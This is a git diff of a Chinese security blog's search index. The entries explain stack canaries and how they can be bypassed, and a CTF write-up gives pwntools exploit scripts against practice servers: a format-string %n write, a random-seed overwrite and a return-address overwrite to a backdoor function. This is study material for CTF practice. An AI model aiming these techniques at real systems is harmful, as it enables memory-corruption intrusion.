@@ -1,6 +1,43 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>canary</title>
+    <url>/2019/11/08/canary/</url>
+    <content><![CDATA[<p>资源链接<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary-zh/</a></p>
+<p><strong>Canary</strong></p>
+<p>Introduction</p>
+<p>由于 stack overflow 而引发的攻击非常普遍也非常古老, 相应地一种叫做 canary 的 mitigation 技术很早就出现在 glibc 里, 直到现在也作为系统安全的第一道防线存在。</p>
+<p>canary 不管是实现还是设计思想都比较简单高效, 就是插入一个值, 在 stack overflow 发生的 高危区域的尾部, 当函数返回之时检测 canary 的值是否经过了改变, 以此来判断 stack/buffer overflow 是否发生.</p>
+<p>Canary 与 windows 下的 GS 保护都是防止栈溢出的有效手段，它的出现很大程度上防止了栈溢出的出现，并且由于它几乎并不消耗系统资源，所以现在成了 linux 下保护机制的标配</p>
+<p><strong>Canary 原理</strong></p>
+<p>在 GCC 中使用 Canary</p>
+<p>可以在 GCC 中使用以下参数设置 Canary:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护</span><br><span class="line">-fstack-protector-all 启用保护，为所有函数插入保护</span><br><span class="line">-fstack-protector-strong</span><br><span class="line">-fstack-protector-explicit 只对有明确stack_protect attribute的函数开启保护</span><br><span class="line">-fno-stack-protector 禁用保护.</span><br></pre></td></tr></table></figure>
+
+<p><strong>Canary 实现原理</strong> </p>
+<p>开启 Canary 保护的 stack 结构大概如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  High</span><br><span class="line">  Address |                 |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | args            |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | return address  |</span><br><span class="line">          +-----------------+</span><br><span class="line">  rbp =&gt;  | old ebp         |</span><br><span class="line">          +-----------------+</span><br><span class="line">rbp-8 =&gt;  | canary value    |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | 局部变量        |</span><br><span class="line">  Low     |                 |</span><br><span class="line">  Address</span><br></pre></td></tr></table></figure>
+
+<p>当程序启用 Canary 编译后，在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中 %ebp-0x8 的位置。 这个操作即为向栈中插入 Canary 值，代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov    rax, qword ptr fs:[0x28]</span><br><span class="line">mov    qword ptr [rbp - 8], rax</span><br></pre></td></tr></table></figure>
+
+<p>在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov    rdx,QWORD PTR [rbp-0x8]</span><br><span class="line">xor    rdx,QWORD PTR fs:0x28</span><br><span class="line">je     0x4005d7 &lt;main+65&gt;</span><br><span class="line">call   0x400460 &lt;__stack_chk_fail@plt&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如果 canary 已经被非法修改，此时程序流程会走到 <strong>stack_chk_fail。</strong>stack_chk_fail 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定，定义如下。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eglibc-2.19/debug/stack_chk_fail.c</span><br><span class="line"></span><br><span class="line">void __attribute__ ((noreturn)) __stack_chk_fail (void)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (&quot;stack smashing detected&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)</span><br><span class="line">&#123;</span><br><span class="line">  /* The loop is added only to keep gcc happy.  */</span><br><span class="line">  while (1)</span><br><span class="line">    __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,</span><br><span class="line">                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这意味可以通过劫持 __stack_chk_fail的 got 值劫持流程或者利用 __stack_chk_fail 泄漏内容 (参见 stack smash)。</p>
+<p>进一步，对于 Linux 来说，fs 寄存器实际指向的是当前栈的 TLS 结构，fs:0x28 指向的正是 stack_guard。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  void *tcb;        /* Pointer to the TCB.  Not necessarily the</span><br><span class="line">                       thread descriptor used by libpthread.  */</span><br><span class="line">  dtv_t *dtv;</span><br><span class="line">  void *self;       /* Pointer to the thread descriptor.  */</span><br><span class="line">  int multiple_threads;</span><br><span class="line">  uintptr_t sysinfo;</span><br><span class="line">  uintptr_t stack_guard;</span><br><span class="line">  ...</span><br><span class="line">&#125; tcbhead_t;</span><br></pre></td></tr></table></figure>
+
+<p>如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。<br>事实上，TLS 中的值由函数 security_init 进行初始化。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">static void</span><br><span class="line">security_init (void)</span><br><span class="line">&#123;</span><br><span class="line">  // _dl_random的值在进入这个函数的时候就已经由kernel写入.</span><br><span class="line">  // glibc直接使用了_dl_random的值并没有给赋值</span><br><span class="line">  // 如果不采用这种模式, glibc也可以自己产生随机数</span><br><span class="line"></span><br><span class="line">  //将_dl_random的最后一个字节设置为0x0</span><br><span class="line">  uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"></span><br><span class="line">  // 设置Canary的值到TLS中</span><br><span class="line">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"></span><br><span class="line">  _dl_random = NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//THREAD_SET_STACK_GUARD宏用于设置TLS</span><br><span class="line">#define THREAD_SET_STACK_GUARD(value) \</span><br><span class="line">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>保护机制</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>bins</title>
     <url>/2020/04/07/bins/</url>
     <content><![CDATA[<blockquote>
@@ -157,165 +194,6 @@
       </tags>
   </entry>
   <entry>
-    <title>canary</title>
-    <url>/2019/11/08/canary/</url>
-    <content><![CDATA[<p>资源链接<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary-zh/</a></p>
-<p><strong>Canary</strong></p>
-<p>Introduction</p>
-<p>由于 stack overflow 而引发的攻击非常普遍也非常古老, 相应地一种叫做 canary 的 mitigation 技术很早就出现在 glibc 里, 直到现在也作为系统安全的第一道防线存在。</p>
-<p>canary 不管是实现还是设计思想都比较简单高效, 就是插入一个值, 在 stack overflow 发生的 高危区域的尾部, 当函数返回之时检测 canary 的值是否经过了改变, 以此来判断 stack/buffer overflow 是否发生.</p>
-<p>Canary 与 windows 下的 GS 保护都是防止栈溢出的有效手段，它的出现很大程度上防止了栈溢出的出现，并且由于它几乎并不消耗系统资源，所以现在成了 linux 下保护机制的标配</p>
-<p><strong>Canary 原理</strong></p>
-<p>在 GCC 中使用 Canary</p>
-<p>可以在 GCC 中使用以下参数设置 Canary:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护</span><br><span class="line">-fstack-protector-all 启用保护，为所有函数插入保护</span><br><span class="line">-fstack-protector-strong</span><br><span class="line">-fstack-protector-explicit 只对有明确stack_protect attribute的函数开启保护</span><br><span class="line">-fno-stack-protector 禁用保护.</span><br></pre></td></tr></table></figure>
-
-<p><strong>Canary 实现原理</strong> </p>
-<p>开启 Canary 保护的 stack 结构大概如下</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  High</span><br><span class="line">  Address |                 |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | args            |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | return address  |</span><br><span class="line">          +-----------------+</span><br><span class="line">  rbp =&gt;  | old ebp         |</span><br><span class="line">          +-----------------+</span><br><span class="line">rbp-8 =&gt;  | canary value    |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | 局部变量        |</span><br><span class="line">  Low     |                 |</span><br><span class="line">  Address</span><br></pre></td></tr></table></figure>
-
-<p>当程序启用 Canary 编译后，在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中 %ebp-0x8 的位置。 这个操作即为向栈中插入 Canary 值，代码如下：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov    rax, qword ptr fs:[0x28]</span><br><span class="line">mov    qword ptr [rbp - 8], rax</span><br></pre></td></tr></table></figure>
-
-<p>在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov    rdx,QWORD PTR [rbp-0x8]</span><br><span class="line">xor    rdx,QWORD PTR fs:0x28</span><br><span class="line">je     0x4005d7 &lt;main+65&gt;</span><br><span class="line">call   0x400460 &lt;__stack_chk_fail@plt&gt;</span><br></pre></td></tr></table></figure>
-
-<p>如果 canary 已经被非法修改，此时程序流程会走到 <strong>stack_chk_fail。</strong>stack_chk_fail 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定，定义如下。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eglibc-2.19/debug/stack_chk_fail.c</span><br><span class="line"></span><br><span class="line">void __attribute__ ((noreturn)) __stack_chk_fail (void)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (&quot;stack smashing detected&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)</span><br><span class="line">&#123;</span><br><span class="line">  /* The loop is added only to keep gcc happy.  */</span><br><span class="line">  while (1)</span><br><span class="line">    __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,</span><br><span class="line">                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这意味可以通过劫持 __stack_chk_fail的 got 值劫持流程或者利用 __stack_chk_fail 泄漏内容 (参见 stack smash)。</p>
-<p>进一步，对于 Linux 来说，fs 寄存器实际指向的是当前栈的 TLS 结构，fs:0x28 指向的正是 stack_guard。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  void *tcb;        /* Pointer to the TCB.  Not necessarily the</span><br><span class="line">                       thread descriptor used by libpthread.  */</span><br><span class="line">  dtv_t *dtv;</span><br><span class="line">  void *self;       /* Pointer to the thread descriptor.  */</span><br><span class="line">  int multiple_threads;</span><br><span class="line">  uintptr_t sysinfo;</span><br><span class="line">  uintptr_t stack_guard;</span><br><span class="line">  ...</span><br><span class="line">&#125; tcbhead_t;</span><br></pre></td></tr></table></figure>
-
-<p>如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。<br>事实上，TLS 中的值由函数 security_init 进行初始化。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">static void</span><br><span class="line">security_init (void)</span><br><span class="line">&#123;</span><br><span class="line">  // _dl_random的值在进入这个函数的时候就已经由kernel写入.</span><br><span class="line">  // glibc直接使用了_dl_random的值并没有给赋值</span><br><span class="line">  // 如果不采用这种模式, glibc也可以自己产生随机数</span><br><span class="line"></span><br><span class="line">  //将_dl_random的最后一个字节设置为0x0</span><br><span class="line">  uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"></span><br><span class="line">  // 设置Canary的值到TLS中</span><br><span class="line">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"></span><br><span class="line">  _dl_random = NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//THREAD_SET_STACK_GUARD宏用于设置TLS</span><br><span class="line">#define THREAD_SET_STACK_GUARD(value) \</span><br><span class="line">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span><br></pre></td></tr></table></figure>]]></content>
-      <tags>
-        <tag>保护机制</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>drops做题收获</title>
-    <url>/2019/08/08/p/</url>
-    <content><![CDATA[<a id="more"></a>
-
-
-
-
-<p>攻防世界 </p>
-<h1 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h1><p>格式化字符串漏洞<br>因为当时做这个题时候不太懂，所以拿出来说说</p>
-<p>分析伪代码，发现修改pwnme的值为8 得到flag</p>
-<p>在.bss段的全局变量，因为没有开启PIE，那就好办了，pwnme这个全局变量的地址是不会变的。<br>改值方法，格式化输出漏洞</p>
-<p> 利用printf格式化字符串漏洞addr+%N$n修改任意地址的值，<br>其中%N$n是以printf第N+1个参数位置的值为地址（printf中格式化字符串是第0个参数），将输出过的字符数量的值写入这个地址中</p>
-<p><strong>用法说明</strong></p>
-<pre><code>%n：将%n之前printf已经打印的字符个数赋值给**偏移处指针**所指向的地址
-位置，如%100×10$n表示将0x64写入偏移10处保存的指针所指向的地址</code></pre><p><strong>疑问：%n的使用方法，偏移量是谁与谁之间的，偏移量为什么不会变</strong></p>
-<p>一<br><img alt data-src="/2019/08/08/p/2.png" class="lazyload"><br>利用%x泄露内容</p>
-<p>可以看到输入的aaaa也就是0x61616161是位于输出的第11位</p>
-<p>然后根据addr+%N$n  可以在<strong>偏移处储存的地址</strong>写入内容</p>
-<p>二<br><img alt data-src="/2019/08/08/p/1.jpg" class="lazyload"><br>经过gdb调试查看栈，可以观察到输入的aaaa距离栈顶也正好10个参数</p>
-<p>所以说偏移处指针会不会是指</p>
-<pre><code>猜测。。。。
-原本printf读取参数的指针指向了栈顶，然后用%n改变指针的指向。。</code></pre><p>最后，此题的最大难点在于获取 %n 所需要的偏移量</p>
-<p>解题思路就是利用格式化输出漏洞将pwnme的值改为8<br>脚本</p>
-<pre><code> from pwn import *
-p=remote(&apos;111.198.29.45&apos;,&quot;39076&quot;);
-
-pwnme=0x804a068
-p.recvuntil(&apos;name:&apos;)
-p.sendline(&apos;qqqq&apos;)
-p.recvuntil(&apos;please:&apos;)
-payload = p32(pwnme)
-payload += &apos;aaaa&apos;
-payload += &apos;%10$n&apos;
-p.sendline(payload)
-p.interactive()</code></pre><h1 id="guess-num-和-进阶-dice-game"><a href="#guess-num-和-进阶-dice-game" class="headerlink" title="guess_num  和 进阶 dice_game"></a>guess_num  和 进阶 dice_game</h1><p>猜随机数的两题，种子是seed[0]，循环n次，均对即可跳到sub_C3E函数执行system(“cat flag”)</p>
-<p><img alt data-src="/2019/08/08/p/3.png" class="lazyload"></p>
-<p>开启了canary,不能直接栈溢出到sub_C3E函数，</p>
-<p>但是区别在于</p>
-<p>一</p>
-<pre><code>guess_num  输入为gets函数 可以溢出到函数返回地址，
-而 dice_game  用的read(0, buf, 0x50uLL);只能栈溢出到seed[0]
-所以guess_num应该可以直接调用sub_C3E函数但需要canary绕过，不知道行不行，大家可以试试。</code></pre><p>二</p>
-<pre><code>guess_num 没给libc库， dice_game给了libc.so.6
-所以写脚本时
-guess_num用的是
-libc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
-而dice_game用的是
-libc = cdll.LoadLibrary(&quot;libc.so.6&quot;)</code></pre><p>做题的主要思想还是利用函数漏洞给随机数种子赋值。提前获取到随机数，<br>经过n次对比成功执行 cat flag 的函数</p>
-<pre><code>srand初始化随机种子,rand产生随机数。
-随机函数生成的随机数并不是真的随机数，他们只是在一定范围内随机，
-实际上是一段数字的循环，这些数字取决于随机种子。
-在调用rand()函数时，必须先利用srand()设好随机数种子，
-如果未设随机数种子，rand()在调用时会自动设随机数种子为1。</code></pre><p>需要我们了解的新知识就是ctypes模块里的 cdll.LoadLibrary 函数</p>
-<p>下面是从</p>
-<p><a href="https://www.cnblogs.com/gaowengang/p/7919219.html" target="_blank" rel="noopener">https://www.cnblogs.com/gaowengang/p/7919219.html</a><br>得到的一些知识</p>
-<pre><code>Python 的 ctypes 要使用 C 函数，需要先将 C 编译成动态链接库的形式，
-即 Windows 下的 .dll 文件，或者 Linux 下的 .so 文件。先来看一下 ctypes 怎么使用 C 标准库。
-
-Windows 系统下的 C 标准库动态链接文件为 msvcrt.dll (一般在目录 C:\Windows\System32 和 C:\Windows\SysWOW64 下分别对应 32-bit 和 64-bit，使用时不用刻意区分，Python 会选择合适的)
-
-Linux 系统下的 C 标准库动态链接文件为 libc.so.6 (以 64-bit Ubuntu 系统为例， 在目录 /lib/x86_64-linux-gnu 下)</code></pre><p>所以guess_num的脚本会用/lib/x86_64-linux-gnu/libc.so.6也是有一定根据的。</p>
-<p>因此我试着将dice_game脚本的libc也改为/lib/x86_64-linux-gnu/libc.so.6一样可以获得flag.</p>
-<p>脚本</p>
-<pre><code>from pwn import *
-from ctypes import *
-#coding:utf-8
-p = remote(&quot;111.198.29.45&quot;,&quot;35346&quot;)
-libc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
-payload = &quot;a&quot;*0x20 +p64(1)
-p.recvuntil(&apos;Your name:&apos;)
-p.sendline(payload)
-libc.srand(1)
-for i in range(10):
-num = str(libc.rand()%6+1)
-p.recvuntil(&apos;number:&apos;)
-p.sendline(num)
-
-p.interactive()</code></pre><h1 id="进阶-forgot"><a href="#进阶-forgot" class="headerlink" title="进阶 forgot"></a>进阶 forgot</h1><p>这一题是看了脚本却不太懂事什么意思的一道题</p>
-<p>开始看完代码发现这题中并没有直接给你某个函数得到flag，<br>于是查找字符，发现了后门函数！</p>
-<p>记下函数的地址。</p>
-<p>最后看了半天，下面把我的理解说一下。其实理解之后也是挺好玩的。。</p>
-<p>搜到的题解</p>
-<pre><code>#! /usr/bin/env python
-from pwn import *
-p=remote(&apos;111.198.29.45&apos;,56015)
-print p.recvuntil(&quot;&gt; &quot;)
-p.sendline(&apos;A&apos;)
-payload=&apos;A&apos;*32+p32(0x080486cc)
-print p.recvuntil(&quot;&gt; &quot;)
-p.sendline(payload)
-print p.recvall()</code></pre><p>只看脚本时候好像是特别简单，不就是覆盖函数返回地址吗？</p>
-<p>但是在 ida 打开后会产生疑问了，为什么是“A”*32<br>有两次输入</p>
-<p><img alt data-src="/2019/08/08/p/4.png" class="lazyload"></p>
-<p>第一次输入使用fgets(&amp;s,32,stdin)<br>从缓冲区输入32位给字符串 s  并不能溢出到函数返回地址</p>
-<p><img alt data-src="/2019/08/08/p/5.png" class="lazyload"></p>
-<p>第二次输入为scanf(“%s”,v2)<br>这一次可以溢出到函数返回地址了</p>
-<p>不过v2距离栈底 0x74 所以构造函数不应该是0x78*”a”+p32(adress)吗<br>但我试过之后发现并不能得到flag</p>
-<p>为什么呢？<br>我也不太清楚。</p>
-<p>下面是为什么用32*”A”的原因</p>
-<p>重点</p>
-<h3 id="代码的最后有-amp-v3-–v14"><a href="#代码的最后有-amp-v3-–v14" class="headerlink" title="代码的最后有(*(&amp;v3+ –v14))();"></a>代码的最后有(*(&amp;v3+ –v14))();</h3><pre><code>v3是int型指针  v14是int数据
-所以这句代码就是 执行 v3加上 v14-1后  所指向的  函数
-因此我们可以用这一句来进行溢出，执行我们找到的 后门函数
-分析代码当v2的值等于‘A’ 时 v14等于 1 所以最后执行v3指向的函数
-可以发现v3距离v2 0x20 也就是32，然后将v3覆盖为后门函数</code></pre><p>后面为了验证正确性，我将v2改为字符’9’ 得到v14为 2</p>
-<p>因此我用下面的脚本验证发现也可行</p>
-<pre><code>#coding:utf-8
-from pwn import *
-
-p=remote(&apos;111.198.29.45&apos;,39341)
-print p.recvuntil(&quot;&gt; &quot;)
-p.sendline(&apos;A&apos;)
-payload=&apos;9&apos;*36+p32(0x080486cc)
-print p.recvuntil(&quot;&gt; &quot;)
-p.sendline(payload)
-print p.recvall()</code></pre><p> 这题中收获还是不小的，起码读懂了代码的执行步骤。<br>希望大家在做题的过程中也能多多发现疑问，<br>使自己做题时知其所以</p>
-]]></content>
-      <tags>
-        <tag>做题题解</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>level0</title>
     <url>/2019/08/08/level0/</url>
     <content><![CDATA[<a id="more"></a>
@@ -443,6 +321,275 @@ p.interactive()</code></pre><p>`</p>
       </tags>
   </entry>
   <entry>
+    <title>shell</title>
+    <url>/2019/10/09/shell/</url>
+    <content><![CDATA[<p>#shell （计算机壳层）<br>在计算机科学中，Shell俗称壳（用来区别于核），是指“为使用者提供操作界面”的软件（命令解析器）。它类似于DOS下的command.com和后来的cmd.exe。它接收用户命令，然后调用相应的应用程序。</p>
+<p>同时它又是一种程序设计语言。作为命令语言，它交互式解释和执行用户输入的命令或者自动地解释和执行预先设定好的一连串的命令；作为程序设计语言，它定义了各种变量和参数，并提供了许多在高级语言中才具有的控制结构，包括循环和分支。<br>在排序算法中，Shell是希尔排序的名称。</p>
+<p>#基本上shell分两大类：</p>
+<p>###一：图形界面shell（Graphical User Interface shell 即 GUI shell）<br>例如：应用最为广泛的 Windows Explorer （微软的windows系列操作系统），还有也包括广为人知的 Linux shell，其中linux shell 包括 X window manager (BlackBox和FluxBox），以及功能更强大的CDE、GNOME、KDE、 XFCE。</p>
+<p>###二：命令行式shell（Command Line Interface shell ，即CLI shell）<br>例如：<br>bash / sh / ksh / csh（Unix/linux 系统）<br>（MS-DOS系统）<br>cmd.exe/ 命令提示字符（Windows NT 系统）<br>Windows PowerShell（支持 .NET Framework 技术的 Windows NT 系统）</p>
+<pre><code>传统意义上的shell指的是命令行式的shell，以后如果不特别注明，shell是指命令行式的shell。
+
+文字操作系统与外部最主要的接口就叫做shell。
+shell是操作系统最外面的一层。
+shell管理你与操作系统之间的交互：
+等待你输入，向操作系统解释你的输入，
+并且处理各种各样的操作系统的输出结果。</code></pre><p>shell提供了你与操作系统之间通讯的方式。这种通讯可以以交互方式（从键盘输入，并且可以立即得到响应），或者以shell script(非交互）方式执行。shell script是放在文件中的一串shell和操作系统命令，它们可以被重复使用。本质上，shell script是命令行命令简单的组合到一个文件里面。</p>
+<p>Shell基本上是一个命令解释器，类似于DOS下的command。它接收用户命令（如ls等），然后调用相应的应用程序。较为通用的shell有标准的Bourne shell (sh）和C shell (csh）。</p>
+<p>###交互式shell和非交互式shell</p>
+<p>交互式模式就是shell等待你的输入，并且执行你提交的命令。这种模式被称作交互式是因为shell与用户进行交互。这种模式也是大多数用户非常熟悉的：登录、执行一些命令、签退。当你签退后，shell也终止了。<br>shell也可以运行在另外一种模式：非交互式模式。在这种模式下，shell不与你进行交互，而是读取存放在文件中的命令，并且执行它们。当它读到文件的结尾，shell也就终止了。</p>
+]]></content>
+      <tags>
+        <tag>计算机基础概念</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>drops做题收获</title>
+    <url>/2019/08/08/p/</url>
+    <content><![CDATA[<a id="more"></a>
+
+
+
+
+<p>攻防世界 </p>
+<h1 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h1><p>格式化字符串漏洞<br>因为当时做这个题时候不太懂，所以拿出来说说</p>
+<p>分析伪代码，发现修改pwnme的值为8 得到flag</p>
+<p>在.bss段的全局变量，因为没有开启PIE，那就好办了，pwnme这个全局变量的地址是不会变的。<br>改值方法，格式化输出漏洞</p>
+<p> 利用printf格式化字符串漏洞addr+%N$n修改任意地址的值，<br>其中%N$n是以printf第N+1个参数位置的值为地址（printf中格式化字符串是第0个参数），将输出过的字符数量的值写入这个地址中</p>
+<p><strong>用法说明</strong></p>
+<pre><code>%n：将%n之前printf已经打印的字符个数赋值给**偏移处指针**所指向的地址
+位置，如%100×10$n表示将0x64写入偏移10处保存的指针所指向的地址</code></pre><p><strong>疑问：%n的使用方法，偏移量是谁与谁之间的，偏移量为什么不会变</strong></p>
+<p>一<br><img alt data-src="/2019/08/08/p/2.png" class="lazyload"><br>利用%x泄露内容</p>
+<p>可以看到输入的aaaa也就是0x61616161是位于输出的第11位</p>
+<p>然后根据addr+%N$n  可以在<strong>偏移处储存的地址</strong>写入内容</p>
+<p>二<br><img alt data-src="/2019/08/08/p/1.jpg" class="lazyload"><br>经过gdb调试查看栈，可以观察到输入的aaaa距离栈顶也正好10个参数</p>
+<p>所以说偏移处指针会不会是指</p>
+<pre><code>猜测。。。。
+原本printf读取参数的指针指向了栈顶，然后用%n改变指针的指向。。</code></pre><p>最后，此题的最大难点在于获取 %n 所需要的偏移量</p>
+<p>解题思路就是利用格式化输出漏洞将pwnme的值改为8<br>脚本</p>
+<pre><code> from pwn import *
+p=remote(&apos;111.198.29.45&apos;,&quot;39076&quot;);
+
+pwnme=0x804a068
+p.recvuntil(&apos;name:&apos;)
+p.sendline(&apos;qqqq&apos;)
+p.recvuntil(&apos;please:&apos;)
+payload = p32(pwnme)
+payload += &apos;aaaa&apos;
+payload += &apos;%10$n&apos;
+p.sendline(payload)
+p.interactive()</code></pre><h1 id="guess-num-和-进阶-dice-game"><a href="#guess-num-和-进阶-dice-game" class="headerlink" title="guess_num  和 进阶 dice_game"></a>guess_num  和 进阶 dice_game</h1><p>猜随机数的两题，种子是seed[0]，循环n次，均对即可跳到sub_C3E函数执行system(“cat flag”)</p>
+<p><img alt data-src="/2019/08/08/p/3.png" class="lazyload"></p>
+<p>开启了canary,不能直接栈溢出到sub_C3E函数，</p>
+<p>但是区别在于</p>
+<p>一</p>
+<pre><code>guess_num  输入为gets函数 可以溢出到函数返回地址，
+而 dice_game  用的read(0, buf, 0x50uLL);只能栈溢出到seed[0]
+所以guess_num应该可以直接调用sub_C3E函数但需要canary绕过，不知道行不行，大家可以试试。</code></pre><p>二</p>
+<pre><code>guess_num 没给libc库， dice_game给了libc.so.6
+所以写脚本时
+guess_num用的是
+libc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+而dice_game用的是
+libc = cdll.LoadLibrary(&quot;libc.so.6&quot;)</code></pre><p>做题的主要思想还是利用函数漏洞给随机数种子赋值。提前获取到随机数，<br>经过n次对比成功执行 cat flag 的函数</p>
+<pre><code>srand初始化随机种子,rand产生随机数。
+随机函数生成的随机数并不是真的随机数，他们只是在一定范围内随机，
+实际上是一段数字的循环，这些数字取决于随机种子。
+在调用rand()函数时，必须先利用srand()设好随机数种子，
+如果未设随机数种子，rand()在调用时会自动设随机数种子为1。</code></pre><p>需要我们了解的新知识就是ctypes模块里的 cdll.LoadLibrary 函数</p>
+<p>下面是从</p>
+<p><a href="https://www.cnblogs.com/gaowengang/p/7919219.html" target="_blank" rel="noopener">https://www.cnblogs.com/gaowengang/p/7919219.html</a><br>得到的一些知识</p>
+<pre><code>Python 的 ctypes 要使用 C 函数，需要先将 C 编译成动态链接库的形式，
+即 Windows 下的 .dll 文件，或者 Linux 下的 .so 文件。先来看一下 ctypes 怎么使用 C 标准库。
+
+Windows 系统下的 C 标准库动态链接文件为 msvcrt.dll (一般在目录 C:\Windows\System32 和 C:\Windows\SysWOW64 下分别对应 32-bit 和 64-bit，使用时不用刻意区分，Python 会选择合适的)
+
+Linux 系统下的 C 标准库动态链接文件为 libc.so.6 (以 64-bit Ubuntu 系统为例， 在目录 /lib/x86_64-linux-gnu 下)</code></pre><p>所以guess_num的脚本会用/lib/x86_64-linux-gnu/libc.so.6也是有一定根据的。</p>
+<p>因此我试着将dice_game脚本的libc也改为/lib/x86_64-linux-gnu/libc.so.6一样可以获得flag.</p>
+<p>脚本</p>
+<pre><code>from pwn import *
+from ctypes import *
+#coding:utf-8
+p = remote(&quot;111.198.29.45&quot;,&quot;35346&quot;)
+libc = cdll.LoadLibrary(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+payload = &quot;a&quot;*0x20 +p64(1)
+p.recvuntil(&apos;Your name:&apos;)
+p.sendline(payload)
+libc.srand(1)
+for i in range(10):
+num = str(libc.rand()%6+1)
+p.recvuntil(&apos;number:&apos;)
+p.sendline(num)
+
+p.interactive()</code></pre><h1 id="进阶-forgot"><a href="#进阶-forgot" class="headerlink" title="进阶 forgot"></a>进阶 forgot</h1><p>这一题是看了脚本却不太懂事什么意思的一道题</p>
+<p>开始看完代码发现这题中并没有直接给你某个函数得到flag，<br>于是查找字符，发现了后门函数！</p>
+<p>记下函数的地址。</p>
+<p>最后看了半天，下面把我的理解说一下。其实理解之后也是挺好玩的。。</p>
+<p>搜到的题解</p>
+<pre><code>#! /usr/bin/env python
+from pwn import *
+p=remote(&apos;111.198.29.45&apos;,56015)
+print p.recvuntil(&quot;&gt; &quot;)
+p.sendline(&apos;A&apos;)
+payload=&apos;A&apos;*32+p32(0x080486cc)
+print p.recvuntil(&quot;&gt; &quot;)
+p.sendline(payload)
+print p.recvall()</code></pre><p>只看脚本时候好像是特别简单，不就是覆盖函数返回地址吗？</p>
+<p>但是在 ida 打开后会产生疑问了，为什么是“A”*32<br>有两次输入</p>
+<p><img alt data-src="/2019/08/08/p/4.png" class="lazyload"></p>
+<p>第一次输入使用fgets(&amp;s,32,stdin)<br>从缓冲区输入32位给字符串 s  并不能溢出到函数返回地址</p>
+<p><img alt data-src="/2019/08/08/p/5.png" class="lazyload"></p>
+<p>第二次输入为scanf(“%s”,v2)<br>这一次可以溢出到函数返回地址了</p>
